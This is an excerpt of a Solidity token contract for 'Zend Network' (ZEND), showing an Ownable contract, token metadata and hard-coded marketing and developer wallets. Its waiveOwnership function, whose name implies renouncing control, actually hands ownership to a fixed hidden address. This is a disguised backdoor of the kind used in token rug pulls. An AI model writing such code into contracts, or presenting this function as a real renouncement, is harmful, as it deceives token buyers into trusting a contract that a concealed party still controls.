...
/**
Telegram : https://t.me/zendnetwork
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x601BD884A18dba01255cAfc3e17C9Aa908e6183c);
    }
...
contract ZendNetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Zend Network";
    string private _symbol = "ZEND";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xF81519014e76bdEBC2e3405012C0F8E01c4bd428);
    address payable public devWalletAddress = payable(0xF81519014e76bdEBC2e3405012C0F8E01c4bd428);
